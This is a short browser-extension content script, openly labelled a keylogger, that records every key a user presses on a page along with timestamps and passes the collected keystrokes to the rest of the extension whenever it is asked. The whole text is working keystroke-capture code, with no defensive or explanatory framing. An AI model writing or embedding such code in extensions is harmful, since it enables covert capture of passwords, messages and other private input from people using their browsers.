console.log("keylogger content script loaded")
const data = []
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    sendResponse(data);
});
document.onkeydown = (event) => {
    data.push([event.key, Date.now()])
}